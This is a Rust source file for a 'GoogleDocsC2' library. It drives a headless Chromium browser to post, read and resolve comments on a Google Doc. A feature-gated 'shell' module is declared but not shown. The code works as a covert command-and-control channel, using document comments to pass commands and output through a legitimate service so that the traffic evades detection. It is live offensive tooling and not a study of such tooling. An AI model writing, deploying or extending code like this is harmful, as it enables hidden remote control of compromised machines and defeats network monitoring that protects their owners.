use async_std::stream::StreamExt;
use chromiumoxide::{Browser, BrowserConfig, Page};

#[cfg(feature = "shell")]
pub mod shell;

pub struct GoogleDocsC2 {
    browser: Browser,
    page: Page,
}

impl Drop for GoogleDocsC2 {
    fn drop(&mut self) {
        async_std::task::block_on(async {
            self.browser.close().await.unwrap();
        });
    }
}

impl GoogleDocsC2 {
    pub async fn new(url: &str) -> Result<GoogleDocsC2, Box<dyn std::error::Error>> {
        let (browser, mut handler) = Browser::launch(BrowserConfig::builder().build()?).await?;

        // spawn a new task that continuously polls the handler
        let _handle = async_std::task::spawn(async move {
            while let Some(h) = handler.next().await {
                if h.is_err() {
                    break;
                }
            }
        });

        let page = browser.new_page(url).await?;
        page.wait_for_navigation().await?;

        async_std::task::sleep(std::time::Duration::from_secs(1)).await;

        Ok(GoogleDocsC2 { browser, page })
    }

    /// Add a comment to the currently opened Google Doc page.
    ///
    /// # Errors
    ///
    /// This function will return an error if the comment could not be added.
    pub async fn add_comment(&self, comment_text: &str) -> Result<(), Box<dyn std::error::Error>> {
        // check that we are on https://docs.google.com/document/
        if !self
            .page
            .url()
            .await?
            .is_some_and(|url| url.contains("https://docs.google.com/document/"))
        {
            return Err("This function only works on Google Docs!".into());
        }

        // find the "Insert" menu, open it, and click "m" to insert a comment
        self.page
            .find_element("div#docs-insert-menu") // find the "Insert" button
            .await?
            .click()
            .await?
            .press_key("m")
            .await?;

        // for good measure, sleep 1s
        async_std::task::sleep(std::time::Duration::from_secs(1)).await;

        // insert the text of the comment into the comment box
        self.page
            .find_element("div.docos-input-contenteditable")
            .await?
            .click()
            .await?
            .type_str(comment_text)
            .await?
            .click()
            .await?;

        // again, sleep 1s to make sure the Google Docs JavaScript has time to process the input
        async_std::task::sleep(std::time::Duration::from_secs(1)).await;

        // click the "Comment" button
        self.page
            .find_element("div.docos-input-buttons-post")
            .await?
            .click()
            .await?;

        // sleep 1s to make sure the comment is added
        async_std::task::sleep(std::time::Duration::from_secs(1)).await;

        Ok(())
    }

    /// Read all comments from the currently opened Google Doc page.
    ///
    /// # Errors
    ///
    /// This function will return an error if the comments could not be read.
    pub async fn read_all_comments(&self) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        // check that we are on https://docs.google.com/document/
        if !self
            .page
            .url()
            .await?
            .is_some_and(|url| url.contains("https://docs.google.com/document/"))
        {
            return Err("This function only works on Google Docs!".into());
        }
        let mut comments = Vec::new();
        for comment in self
            .page
            .find_elements("div.docos-replyview-body")
            .await?
            .into_iter()
        {
            if let Some(comment) = comment.inner_text().await? {
                comments.push(comment);
            }
        }
        Ok(comments)
    }

    pub async fn clear_all_comments(&self) -> Result<(), Box<dyn std::error::Error>> {
        // check that we are on https://docs.google.com/document/
        if !self
            .page
            .url()
            .await?
            .is_some_and(|url| url.contains("https://docs.google.com/document/"))
        {
            return Err("This function only works on Google Docs!".into());
        }

        for comment in self
            .page
            .find_elements("div.docos-replyview-resolve-button")
            .await?
            .into_iter()
        {
            comment.click().await?;
            // sleep 1s to make sure the comment is resolved
            async_std::task::sleep(std::time::Duration::from_millis(250)).await;
        }

        Ok(())
    }
}
